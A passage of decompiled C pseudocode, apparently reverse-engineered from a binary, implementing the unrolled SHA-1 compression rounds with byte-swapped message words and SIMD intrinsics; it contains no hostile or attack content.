        v838 = v836 + (v834 ^ v831 ^ v832) + v1560.m128i_i32[1] + v828;
        v387 = _mm_sub_epi32(v1546, v378);
        v839 = __ROL4__(v838, 5);
        v840 = __ROR4__(v836, 7);
        v841 = v839 + (v837 ^ v834 ^ v835) + v1560.m128i_i32[2] + v831;
        v842 = __ROL4__(v841, 5) + (v840 ^ v837 ^ v838) + v1560.m128i_i32[3] + v834;
        v843 = (_DWORD *)v1574.m128i_i32[0];
        v379 = *(_DWORD *)v1574.m128i_i32[0] + v842;
        v844 = *(_DWORD *)(v1574.m128i_i32[0] + 4) + v841;
        v381 = *(_DWORD *)(v1574.m128i_i32[0] + 8) + __ROR4__(v839, 7);
        *(_DWORD *)v1574.m128i_i32[0] = v379;
        v382 = v843[3] + v840;
        v843[1] = v844;
        v383 = v843[4] + v837;
        v843[2] = v381;
        v843[3] = v382;
        v843[4] = v383;
        v845 = v844;
        v388 = _mm_shuffle_epi32(v385, 238);
        v389 = (v382 ^ v381) & v844;
        v380 = v845;
      }
      v846 = v802;
      v847 = __ROL4__(v802, 5);
      v848 = __ROR4__(v799, 7);
      v849 = v847 + (v801 ^ v800) + v1540.m128i_i32[0] + v794;
      v850 = __ROL4__(v849, 5);
      v851 = __ROR4__(v847, 7);
      v852 = v850 + (v848 ^ v801 ^ v846) + v1540.m128i_i32[1] + v797;
      v853 = __ROL4__(v852, 5);
      v854 = __ROR4__(v850, 7);
      v855 = v853 + (v851 ^ v848 ^ v849) + v1540.m128i_i32[2] + v801;
      v856 = __ROL4__(v855, 5);
      v857 = __ROR4__(v853, 7);
      v858 = v856 + (v854 ^ v851 ^ v852) + v1540.m128i_i32[3] + v848;
      v859 = __ROL4__(v858, 5);
      v860 = __ROR4__(v856, 7);
      v861 = v859 + (v857 ^ v854 ^ v855) + v1550.m128i_i32[0] + v851;
      v862 = __ROL4__(v861, 5);
      v863 = __ROR4__(v859, 7);
      v864 = v862 + (v860 ^ v857 ^ v858) + v1550.m128i_i32[1] + v854;
      v865 = __ROL4__(v864, 5);
      v866 = __ROR4__(v862, 7);
      v867 = v865 + (v863 ^ v860 ^ v861) + v1550.m128i_i32[2] + v857;
      v868 = __ROL4__(v867, 5);
      v869 = __ROR4__(v865, 7);
      v870 = v868 + (v866 ^ v863 ^ v864) + v1550.m128i_i32[3] + v860;
      v871 = __ROL4__(v870, 5);
      v872 = __ROR4__(v868, 7);
      v873 = v871 + (v869 ^ v866 ^ v867) + v1560.m128i_i32[0] + v863;
      v874 = __ROL4__(v873, 5);
      v875 = __ROR4__(v871, 7);
      v876 = v874 + (v872 ^ v869 ^ v870) + v1560.m128i_i32[1] + v866;
      v877 = __ROL4__(v876, 5);
      v878 = __ROR4__(v874, 7);
      v879 = v877 + (v875 ^ v872 ^ v873) + v1560.m128i_i32[2] + v869;
      v880 = __ROL4__(v879, 5) + (v878 ^ v875 ^ v876) + v1560.m128i_i32[3] + v872;
      v881 = (_DWORD *)v1574.m128i_i32[0];
      result = *(_DWORD *)v1574.m128i_i32[0] + v880;
      v882 = *(_DWORD *)(v1574.m128i_i32[0] + 4) + v879;
      v883 = *(_DWORD *)(v1574.m128i_i32[0] + 8) + __ROR4__(v877, 7);
      *(_DWORD *)v1574.m128i_i32[0] = result;
      v884 = v881[3] + v878;
      v881[1] = v882;
      v885 = v881[4] + v875;
      v881[2] = v883;
      v881[3] = v884;
      v881[4] = v885;
    }
  }
  else
  {
    v5 = (__int32 *)a1;
    v6 = (unsigned int *)a2;
    v1577 = (unsigned int)&a2[4 * a3];
    v7 = a1[1].m128i_i32[0];
    do
    {
      v8 = _byteswap_ulong(v6[2]);
      v9 = _byteswap_ulong(v6[3]);
      *(__int64 *)((char *)v1570.m128i_i64 + 4) = __PAIR64__(_byteswap_ulong(v6[1]), _byteswap_ulong(*v6));
      v1570.m128i_i32[3] = v8;
      v1571.m128i_i32[0] = v9;
      v10 = _byteswap_ulong(v6[6]);
      v11 = _byteswap_ulong(v6[7]);
      *(__int64 *)((char *)v1571.m128i_i64 + 4) = __PAIR64__(_byteswap_ulong(v6[5]), _byteswap_ulong(v6[4]));
      v1571.m128i_i32[3] = v10;
      v1572.m128i_i32[0] = v11;
      v12 = _byteswap_ulong(v6[10]);
      v13 = _byteswap_ulong(v6[11]);
      *(__int64 *)((char *)v1572.m128i_i64 + 4) = __PAIR64__(_byteswap_ulong(v6[9]), _byteswap_ulong(v6[8]));
      v1572.m128i_i32[3] = v12;
      v1573.m128i_i32[0] = v13;
      v14 = _byteswap_ulong(v6[14]);
      v15 = _byteswap_ulong(v6[15]);
      *(__int64 *)((char *)v1573.m128i_i64 + 4) = __PAIR64__(_byteswap_ulong(v6[13]), _byteswap_ulong(v6[12]));
      v1573.m128i_i32[3] = v14;
      v1574.m128i_i32[0] = v15;
      v1576 = v6;
      v16 = v5[1];
      v17 = v5[2];
      v18 = v5[3];
      v19 = v16 & (v18 ^ v17);
      v20 = __ROR4__(v16, 2);
      v21 = (v18 ^ v19) + v7 + __ROL4__(*v5, 5) + v1570.m128i_i32[1] + 1518500249;
      v22 = __ROR4__(*v5, 2);
      v23 = (v17 ^ *v5 & (v17 ^ v20)) + v18 + __ROL4__(v21, 5) + v1570.m128i_i32[2] + 1518500249;
      v24 = v21 & (v20 ^ v22);
      v25 = __ROR4__(v21, 2);
      v26 = (v20 ^ v24) + v17 + __ROL4__(v23, 5) + v1570.m128i_i32[3] + 1518500249;
      v27 = v23 & (v22 ^ v25);
      v28 = __ROR4__(v23, 2);
      v29 = (v22 ^ v27) + v20 + __ROL4__(v26, 5) + v1571.m128i_i32[0] + 1518500249;
      v30 = v26 & (v25 ^ v28);
      v31 = __ROR4__(v26, 2);
      v32 = (v25 ^ v30) + v22 + __ROL4__(v29, 5) + v1571.m128i_i32[1] + 1518500249;
      v33 = v29 & (v28 ^ v31);
      v34 = __ROR4__(v29, 2);
      v35 = (v28 ^ v33) + v25 + __ROL4__(v32, 5) + v1571.m128i_i32[2] + 1518500249;
      v36 = v32 & (v31 ^ v34);
      v37 = __ROR4__(v32, 2);
      v38 = (v31 ^ v36) + v28 + __ROL4__(v35, 5) + v1571.m128i_i32[3] + 1518500249;
      v39 = v35 & (v34 ^ v37);
      v40 = __ROR4__(v35, 2);
      v41 = (v34 ^ v39) + v31 + __ROL4__(v38, 5) + v1572.m128i_i32[0] + 1518500249;
      v42 = v38 & (v37 ^ v40);
      v43 = __ROR4__(v38, 2);
      v44 = (v37 ^ v42) + v34 + __ROL4__(v41, 5) + v1572.m128i_i32[1] + 1518500249;
      v45 = v41 & (v40 ^ v43);
      v46 = __ROR4__(v41, 2);
      v47 = (v40 ^ v45) + v37 + __ROL4__(v44, 5) + v1572.m128i_i32[2] + 1518500249;
      v48 = v44 & (v43 ^ v46);
      v49 = __ROR4__(v44, 2);
      v50 = (v43 ^ v48) + v40 + __ROL4__(v47, 5) + v1572.m128i_i32[3] + 1518500249;
      v51 = v47 & (v46 ^ v49);
      v52 = __ROR4__(v47, 2);
      v53 = (v46 ^ v51) + v43 + __ROL4__(v50, 5) + v1573.m128i_i32[0] + 1518500249;
      v54 = v50 & (v49 ^ v52);
      v55 = __ROR4__(v50, 2);
      v56 = (v49 ^ v54) + v46 + __ROL4__(v53, 5) + v1573.m128i_i32[1] + 1518500249;
      v57 = v53 & (v52 ^ v55);
      v58 = __ROR4__(v53, 2);
      v59 = (v52 ^ v57) + v49 + __ROL4__(v56, 5) + v1573.m128i_i32[2] + 1518500249;
      v60 = v56 & (v55 ^ v58);
      v61 = __ROR4__(v56, 2);
      v62 = (v55 ^ v60) + v52 + __ROL4__(v59, 5) + v1573.m128i_i32[3] + 1518500249;
      v63 = v59 & (v58 ^ v61);
      v64 = __ROR4__(v59, 2);
      v65 = v55 + __ROL4__(v62, 5) + v1574.m128i_i32[0] + 1518500249 + (v58 ^ v63);
      v66 = (v61 ^ v62 & (v61 ^ v64)) + v58;
      v67 = __ROR4__(v62, 2);
      *(__int64 *)((char *)v1570.m128i_i64 + 4) = __PAIR64__(
                                                    __ROL4__(
                                                      v1573.m128i_i32[3] ^ v1572.m128i_i32[2] ^ v1571.m128i_i32[0] ^ v1570.m128i_i32[2],
                                                      1),
                                                    __ROL4__(
                                                      v1573.m128i_i32[2] ^ v1572.m128i_i32[1] ^ v1570.m128i_i32[3] ^ v1570.m128i_i32[1],
                                                      1));
      v68 = __ROL4__(v65, 5) + v1570.m128i_i32[1] + v66 + 1518500249;
      v69 = (v64 ^ v65 & (v64 ^ v67)) + v61;
      v70 = __ROR4__(v65, 2);
      v71 = __ROL4__(v68, 5) + v1570.m128i_i32[2] + v69 + 1518500249;
      v72 = (v67 ^ v68 & (v67 ^ v70)) + v64;
      v73 = __ROR4__(v68, 2);
      v1570.m128i_i32[3] = __ROL4__(
                             v1574.m128i_i32[0] ^ v1572.m128i_i32[3] ^ v1571.m128i_i32[1] ^ v1570.m128i_i32[3],
                             1);
      v74 = __ROL4__(v71, 5) + v1570.m128i_i32[3] + v72 + 1518500249;
      v75 = (v70 ^ v71 & (v70 ^ v73)) + v67;
      v76 = __ROR4__(v71, 2);
      v1571.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1570.m128i_i32[2] ^ v1573.m128i_i32[1] ^ v1571.m128i_i32[3] ^ v1571.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[1] ^ v1573.m128i_i32[0] ^ v1571.m128i_i32[2] ^ v1571.m128i_i32[0],
                               1));
      v77 = __ROL4__(v74, 5) + v1571.m128i_i32[0] + v75 + 1518500249;
      v78 = (v73 ^ v76 ^ v74) + v70;
      v79 = __ROR4__(v74, 2);
      v80 = __ROL4__(v77, 5) + v1571.m128i_i32[1] + v78 + 1859775393;
      v81 = (v76 ^ v79 ^ v77) + v73;
      v82 = __ROR4__(v77, 2);
      v1571.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[0] ^ v1573.m128i_i32[3] ^ v1572.m128i_i32[1] ^ v1571.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[3] ^ v1573.m128i_i32[2] ^ v1572.m128i_i32[0] ^ v1571.m128i_i32[2],
                               1));
      v83 = __ROL4__(v80, 5) + v1571.m128i_i32[2] + v81 + 1859775393;
      v84 = (v79 ^ v82 ^ v80) + v76;
      v85 = __ROR4__(v80, 2);
      v86 = __ROL4__(v83, 5) + v1571.m128i_i32[3] + v84 + 1859775393;
      v87 = (v82 ^ v85 ^ v83) + v79;
      v88 = __ROR4__(v83, 2);
      v1572.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[2] ^ v1570.m128i_i32[1] ^ v1572.m128i_i32[3] ^ v1572.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[1] ^ v1574.m128i_i32[0] ^ v1572.m128i_i32[2] ^ v1572.m128i_i32[0],
                               1));
      v89 = __ROL4__(v86, 5) + v1572.m128i_i32[0] + v87 + 1859775393;
      v90 = (v85 ^ v88 ^ v86) + v82;
      v91 = __ROR4__(v86, 2);
      v92 = __ROL4__(v89, 5) + v1572.m128i_i32[1] + v90 + 1859775393;
      v93 = (v88 ^ v91 ^ v89) + v85;
      v94 = __ROR4__(v89, 2);
      v1572.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[0] ^ v1570.m128i_i32[3] ^ v1573.m128i_i32[1] ^ v1572.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[3] ^ v1570.m128i_i32[2] ^ v1573.m128i_i32[0] ^ v1572.m128i_i32[2],
                               1));
      v95 = __ROL4__(v92, 5) + v1572.m128i_i32[2] + v93 + 1859775393;
      v96 = (v91 ^ v94 ^ v92) + v88;
      v97 = __ROR4__(v92, 2);
      v98 = __ROL4__(v95, 5) + v1572.m128i_i32[3] + v96 + 1859775393;
      v99 = (v94 ^ v97 ^ v95) + v91;
      v100 = __ROR4__(v95, 2);
      v1573.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[2] ^ v1571.m128i_i32[1] ^ v1573.m128i_i32[3] ^ v1573.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[1] ^ v1571.m128i_i32[0] ^ v1573.m128i_i32[2] ^ v1573.m128i_i32[0],
                               1));
      v101 = __ROL4__(v98, 5) + v1573.m128i_i32[0] + v99 + 1859775393;
      v102 = (v97 ^ v100 ^ v98) + v94;
      v103 = __ROR4__(v98, 2);
      v104 = __ROL4__(v101, 5) + v1573.m128i_i32[1] + v102 + 1859775393;
      v105 = (v100 ^ v103 ^ v101) + v97;
      v106 = __ROR4__(v101, 2);
      v1573.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1573.m128i_i32[0] ^ v1571.m128i_i32[3] ^ v1570.m128i_i32[1] ^ v1573.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[3] ^ v1571.m128i_i32[2] ^ v1574.m128i_i32[0] ^ v1573.m128i_i32[2],
                               1));
      v107 = __ROL4__(v104, 5) + v1573.m128i_i32[2] + v105 + 1859775393;
      v108 = (v103 ^ v106 ^ v104) + v100;
      v109 = __ROR4__(v104, 2);
      v110 = __ROL4__(v107, 5) + v1573.m128i_i32[3] + v108 + 1859775393;
      v111 = (v106 ^ v109 ^ v107) + v103;
      v112 = __ROR4__(v107, 2);
      v1574.m128i_i32[0] = __ROL4__(
                             v1573.m128i_i32[1] ^ v1572.m128i_i32[0] ^ v1570.m128i_i32[2] ^ v1574.m128i_i32[0],
                             1);
      v113 = __ROL4__(v110, 5) + v1574.m128i_i32[0] + v111 + 1859775393;
      v114 = (v109 ^ v112 ^ v110) + v106;
      v115 = __ROR4__(v110, 2);
      *(__int64 *)((char *)v1570.m128i_i64 + 4) = __PAIR64__(
                                                    __ROL4__(
                                                      v1573.m128i_i32[3] ^ v1572.m128i_i32[2] ^ v1571.m128i_i32[0] ^ v1570.m128i_i32[2],
                                                      1),
                                                    __ROL4__(
                                                      v1573.m128i_i32[2] ^ v1572.m128i_i32[1] ^ v1570.m128i_i32[3] ^ v1570.m128i_i32[1],
                                                      1));
      v116 = __ROL4__(v113, 5) + v1570.m128i_i32[1] + v114 + 1859775393;
      v117 = (v112 ^ v115 ^ v113) + v109;
      v118 = __ROR4__(v113, 2);
      v119 = __ROL4__(v116, 5) + v1570.m128i_i32[2] + v117 + 1859775393;
      v120 = (v115 ^ v118 ^ v116) + v112;
      v121 = __ROR4__(v116, 2);
      v1570.m128i_i32[3] = __ROL4__(
                             v1574.m128i_i32[0] ^ v1572.m128i_i32[3] ^ v1571.m128i_i32[1] ^ v1570.m128i_i32[3],
                             1);
      v122 = __ROL4__(v119, 5) + v1570.m128i_i32[3] + v120 + 1859775393;
      v123 = (v118 ^ v121 ^ v119) + v115;
      v124 = __ROR4__(v119, 2);
      v1571.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1570.m128i_i32[2] ^ v1573.m128i_i32[1] ^ v1571.m128i_i32[3] ^ v1571.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[1] ^ v1573.m128i_i32[0] ^ v1571.m128i_i32[2] ^ v1571.m128i_i32[0],
                               1));
      v125 = __ROL4__(v122, 5) + v1571.m128i_i32[0] + v123 + 1859775393;
      v126 = (v121 ^ v124 ^ v122) + v118;
      v127 = __ROR4__(v122, 2);
      v128 = __ROL4__(v125, 5) + v1571.m128i_i32[1] + v126 + 1859775393;
      v129 = (v124 ^ v127 ^ v125) + v121;
      v130 = __ROR4__(v125, 2);
      v1571.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[0] ^ v1573.m128i_i32[3] ^ v1572.m128i_i32[1] ^ v1571.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[3] ^ v1573.m128i_i32[2] ^ v1572.m128i_i32[0] ^ v1571.m128i_i32[2],
                               1));
      v131 = __ROL4__(v128, 5) + v1571.m128i_i32[2] + v129 + 1859775393;
      v132 = (v127 ^ v130 ^ v128) + v124;
      v133 = __ROR4__(v128, 2);
      v134 = __ROL4__(v131, 5) + v1571.m128i_i32[3] + v132 + 1859775393;
      v135 = (v130 ^ v133 ^ v131) + v127;
      v136 = __ROR4__(v131, 2);
      v1572.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[2] ^ v1570.m128i_i32[1] ^ v1572.m128i_i32[3] ^ v1572.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[1] ^ v1574.m128i_i32[0] ^ v1572.m128i_i32[2] ^ v1572.m128i_i32[0],
                               1));
      v137 = __ROL4__(v134, 5) + v1572.m128i_i32[0] + v135 + 1859775393;
      v138 = v130 + (v134 & (v133 ^ v136));
      v139 = __ROR4__(v134, 2);
      v140 = (v133 & v136) + __ROL4__(v137, 5) + v1572.m128i_i32[1] + v138 - 1894007588;
      v141 = v133 + (v137 & (v136 ^ v139));
      v142 = __ROR4__(v137, 2);
      v1572.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[0] ^ v1570.m128i_i32[3] ^ v1573.m128i_i32[1] ^ v1572.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[3] ^ v1570.m128i_i32[2] ^ v1573.m128i_i32[0] ^ v1572.m128i_i32[2],
                               1));
      v143 = (v136 & v139) + __ROL4__(v140, 5) + v1572.m128i_i32[2] + v141 - 1894007588;
      v144 = v136 + (v140 & (v139 ^ v142));
      v145 = __ROR4__(v140, 2);
      v146 = (v139 & v142) + __ROL4__(v143, 5) + v1572.m128i_i32[3] + v144 - 1894007588;
      v147 = v139 + (v143 & (v142 ^ v145));
      v148 = __ROR4__(v143, 2);
      v1573.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[2] ^ v1571.m128i_i32[1] ^ v1573.m128i_i32[3] ^ v1573.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[1] ^ v1571.m128i_i32[0] ^ v1573.m128i_i32[2] ^ v1573.m128i_i32[0],
                               1));
      v149 = (v142 & v145) + __ROL4__(v146, 5) + v1573.m128i_i32[0] + v147 - 1894007588;
      v150 = v142 + (v146 & (v145 ^ v148));
      v151 = __ROR4__(v146, 2);
      v152 = (v145 & v148) + __ROL4__(v149, 5) + v1573.m128i_i32[1] + v150 - 1894007588;
      v153 = v145 + (v149 & (v148 ^ v151));
      v154 = __ROR4__(v149, 2);
      v1573.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1573.m128i_i32[0] ^ v1571.m128i_i32[3] ^ v1570.m128i_i32[1] ^ v1573.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[3] ^ v1571.m128i_i32[2] ^ v1574.m128i_i32[0] ^ v1573.m128i_i32[2],
                               1));
      v155 = (v148 & v151) + __ROL4__(v152, 5) + v1573.m128i_i32[2] + v153 - 1894007588;
      v156 = v148 + (v152 & (v151 ^ v154));
      v157 = __ROR4__(v152, 2);
      v158 = (v151 & v154) + __ROL4__(v155, 5) + v1573.m128i_i32[3] + v156 - 1894007588;
      v159 = v151 + (v155 & (v154 ^ v157));
      v160 = __ROR4__(v155, 2);
      v1574.m128i_i32[0] = __ROL4__(
                             v1573.m128i_i32[1] ^ v1572.m128i_i32[0] ^ v1570.m128i_i32[2] ^ v1574.m128i_i32[0],
                             1);
      v161 = (v154 & v157) + __ROL4__(v158, 5) + v1574.m128i_i32[0] + v159 - 1894007588;
      v162 = v154 + (v158 & (v157 ^ v160));
      v163 = __ROR4__(v158, 2);
      *(__int64 *)((char *)v1570.m128i_i64 + 4) = __PAIR64__(
                                                    __ROL4__(
                                                      v1573.m128i_i32[3] ^ v1572.m128i_i32[2] ^ v1571.m128i_i32[0] ^ v1570.m128i_i32[2],
                                                      1),
                                                    __ROL4__(
                                                      v1573.m128i_i32[2] ^ v1572.m128i_i32[1] ^ v1570.m128i_i32[3] ^ v1570.m128i_i32[1],
                                                      1));
      v164 = (v157 & v160) + __ROL4__(v161, 5) + v1570.m128i_i32[1] + v162 - 1894007588;
      v165 = v157 + (v161 & (v160 ^ v163));
      v166 = __ROR4__(v161, 2);
      v167 = (v160 & v163) + __ROL4__(v164, 5) + v1570.m128i_i32[2] + v165 - 1894007588;
      v168 = v160 + (v164 & (v163 ^ v166));
      v169 = __ROR4__(v164, 2);
      v1570.m128i_i32[3] = __ROL4__(
                             v1574.m128i_i32[0] ^ v1572.m128i_i32[3] ^ v1571.m128i_i32[1] ^ v1570.m128i_i32[3],
                             1);
      v170 = (v163 & v166) + __ROL4__(v167, 5) + v1570.m128i_i32[3] + v168 - 1894007588;
      v171 = v163 + (v167 & (v166 ^ v169));
      v172 = __ROR4__(v167, 2);
      v1571.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1570.m128i_i32[2] ^ v1573.m128i_i32[1] ^ v1571.m128i_i32[3] ^ v1571.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[1] ^ v1573.m128i_i32[0] ^ v1571.m128i_i32[2] ^ v1571.m128i_i32[0],
                               1));
      v173 = (v166 & v169) + __ROL4__(v170, 5) + v1571.m128i_i32[0] + v171 - 1894007588;
      v174 = v166 + (v170 & (v169 ^ v172));
      v175 = __ROR4__(v170, 2);
      v176 = (v169 & v172) + __ROL4__(v173, 5) + v1571.m128i_i32[1] + v174 - 1894007588;
      v177 = v169 + (v173 & (v172 ^ v175));
      v178 = __ROR4__(v173, 2);
      v1571.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[0] ^ v1573.m128i_i32[3] ^ v1572.m128i_i32[1] ^ v1571.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[3] ^ v1573.m128i_i32[2] ^ v1572.m128i_i32[0] ^ v1571.m128i_i32[2],
                               1));
      v179 = (v172 & v175) + __ROL4__(v176, 5) + v1571.m128i_i32[2] + v177 - 1894007588;
      v180 = v172 + (v176 & (v175 ^ v178));
      v181 = __ROR4__(v176, 2);
      v182 = (v175 & v178) + __ROL4__(v179, 5) + v1571.m128i_i32[3] + v180 - 1894007588;
      v183 = v175 + (v179 & (v178 ^ v181));
      v184 = __ROR4__(v179, 2);
      v1572.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[2] ^ v1570.m128i_i32[1] ^ v1572.m128i_i32[3] ^ v1572.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[1] ^ v1574.m128i_i32[0] ^ v1572.m128i_i32[2] ^ v1572.m128i_i32[0],
                               1));
      v185 = (v178 & v181) + __ROL4__(v182, 5) + v1572.m128i_i32[0] + v183 - 1894007588;
      v186 = v178 + (v182 & (v181 ^ v184));
      v187 = __ROR4__(v182, 2);
      v188 = (v181 & v184) + __ROL4__(v185, 5) + v1572.m128i_i32[1] + v186 - 1894007588;
      v189 = v181 + (v185 & (v184 ^ v187));
      v190 = __ROR4__(v185, 2);
      v1572.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[0] ^ v1570.m128i_i32[3] ^ v1573.m128i_i32[1] ^ v1572.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[3] ^ v1570.m128i_i32[2] ^ v1573.m128i_i32[0] ^ v1572.m128i_i32[2],
                               1));
      v191 = (v184 & v187) + __ROL4__(v188, 5) + v1572.m128i_i32[2] + v189 - 1894007588;
      v192 = v184 + (v188 & (v187 ^ v190));
      v193 = __ROR4__(v188, 2);
      v194 = (v187 & v190) + __ROL4__(v191, 5) + v1572.m128i_i32[3] + v192 - 1894007588;
      v195 = v187 + (v191 & (v190 ^ v193));
      v196 = __ROR4__(v191, 2);
      v1573.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[2] ^ v1571.m128i_i32[1] ^ v1573.m128i_i32[3] ^ v1573.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[1] ^ v1571.m128i_i32[0] ^ v1573.m128i_i32[2] ^ v1573.m128i_i32[0],
                               1));
      v197 = (v190 & v193) + __ROL4__(v194, 5) + v1573.m128i_i32[0] + v195 - 1894007588;
      v198 = (v193 ^ v196 ^ v194) + v190;
      v199 = __ROR4__(v194, 2);
      v200 = __ROL4__(v197, 5) + v1573.m128i_i32[1] + v198 - 899497514;
      v201 = (v196 ^ v199 ^ v197) + v193;
      v202 = __ROR4__(v197, 2);
      v1573.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1573.m128i_i32[0] ^ v1571.m128i_i32[3] ^ v1570.m128i_i32[1] ^ v1573.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1572.m128i_i32[3] ^ v1571.m128i_i32[2] ^ v1574.m128i_i32[0] ^ v1573.m128i_i32[2],
                               1));
      v203 = __ROL4__(v200, 5) + v1573.m128i_i32[2] + v201 - 899497514;
      v204 = (v199 ^ v202 ^ v200) + v196;
      v205 = __ROR4__(v200, 2);
      v206 = __ROL4__(v203, 5) + v1573.m128i_i32[3] + v204 - 899497514;
      v207 = (v202 ^ v205 ^ v203) + v199;
      v208 = __ROR4__(v203, 2);
      v1574.m128i_i32[0] = __ROL4__(
                             v1573.m128i_i32[1] ^ v1572.m128i_i32[0] ^ v1570.m128i_i32[2] ^ v1574.m128i_i32[0],
                             1);
      v209 = __ROL4__(v206, 5) + v1574.m128i_i32[0] + v207 - 899497514;
      v210 = (v205 ^ v208 ^ v206) + v202;
      v211 = __ROR4__(v206, 2);
      *(__int64 *)((char *)v1570.m128i_i64 + 4) = __PAIR64__(
                                                    __ROL4__(
                                                      v1573.m128i_i32[3] ^ v1572.m128i_i32[2] ^ v1571.m128i_i32[0] ^ v1570.m128i_i32[2],
                                                      1),
                                                    __ROL4__(
                                                      v1573.m128i_i32[2] ^ v1572.m128i_i32[1] ^ v1570.m128i_i32[3] ^ v1570.m128i_i32[1],
                                                      1));
      v212 = __ROL4__(v209, 5) + v1570.m128i_i32[1] + v210 - 899497514;
      v213 = (v208 ^ v211 ^ v209) + v205;
      v214 = __ROR4__(v209, 2);
      v215 = __ROL4__(v212, 5) + v1570.m128i_i32[2] + v213 - 899497514;
      v216 = (v211 ^ v214 ^ v212) + v208;
      v217 = __ROR4__(v212, 2);
      v1570.m128i_i32[3] = __ROL4__(
                             v1574.m128i_i32[0] ^ v1572.m128i_i32[3] ^ v1571.m128i_i32[1] ^ v1570.m128i_i32[3],
                             1);
      v218 = __ROL4__(v215, 5) + v1570.m128i_i32[3] + v216 - 899497514;
      v219 = (v214 ^ v217 ^ v215) + v211;
      v220 = __ROR4__(v215, 2);
      v1571.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1570.m128i_i32[2] ^ v1573.m128i_i32[1] ^ v1571.m128i_i32[3] ^ v1571.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[1] ^ v1573.m128i_i32[0] ^ v1571.m128i_i32[2] ^ v1571.m128i_i32[0],
                               1));
      v221 = __ROL4__(v218, 5) + v1571.m128i_i32[0] + v219 - 899497514;
      v222 = (v217 ^ v220 ^ v218) + v214;
      v223 = __ROR4__(v218, 2);
      v224 = __ROL4__(v221, 5) + v1571.m128i_i32[1] + v222 - 899497514;
      v225 = (v220 ^ v223 ^ v221) + v217;
      v226 = __ROR4__(v221, 2);
      v1571.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[0] ^ v1573.m128i_i32[3] ^ v1572.m128i_i32[1] ^ v1571.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1570.m128i_i32[3] ^ v1573.m128i_i32[2] ^ v1572.m128i_i32[0] ^ v1571.m128i_i32[2],
                               1));
      v227 = __ROL4__(v224, 5) + v1571.m128i_i32[2] + v225 - 899497514;
      v228 = (v223 ^ v226 ^ v224) + v220;
      v229 = __ROR4__(v224, 2);
      v230 = __ROL4__(v227, 5) + v1571.m128i_i32[3] + v228 - 899497514;
      v231 = (v226 ^ v229 ^ v227) + v223;
      v232 = __ROR4__(v227, 2);
      v1572.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
                               v1571.m128i_i32[2] ^ v1570.m128i_i32[1] ^ v1572.m128i_i32[3] ^ v1572.m128i_i32[1],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[1] ^ v1574.m128i_i32[0] ^ v1572.m128i_i32[2] ^ v1572.m128i_i32[0],
                               1));
      v233 = __ROL4__(v230, 5) + v1572.m128i_i32[0] + v231 - 899497514;
      v234 = (v229 ^ v232 ^ v230) + v226;
      v235 = __ROR4__(v230, 2);
      v236 = __ROL4__(v233, 5) + v1572.m128i_i32[1] + v234 - 899497514;
      v237 = (v232 ^ v235 ^ v233) + v229;
      v238 = __ROR4__(v233, 2);
      v1572.m128i_i64[1] = __PAIR64__(
                             __ROL4__(
                               v1572.m128i_i32[0] ^ v1570.m128i_i32[3] ^ v1573.m128i_i32[1] ^ v1572.m128i_i32[3],
                               1),
                             __ROL4__(
                               v1571.m128i_i32[3] ^ v1570.m128i_i32[2] ^ v1573.m128i_i32[0] ^ v1572.m128i_i32[2],
                               1));
      v239 = __ROL4__(v236, 5) + v1572.m128i_i32[2] + v237 - 899497514;
      v240 = (v235 ^ v238 ^ v236) + v232;
      v241 = __ROR4__(v236, 2);
      v242 = __ROL4__(v239, 5) + v1572.m128i_i32[3] + v240 - 899497514;
      v243 = (v238 ^ v241 ^ v239) + v235;
      v244 = __ROR4__(v239, 2);
      v1573.m128i_i64[0] = __PAIR64__(
                             __ROL4__(
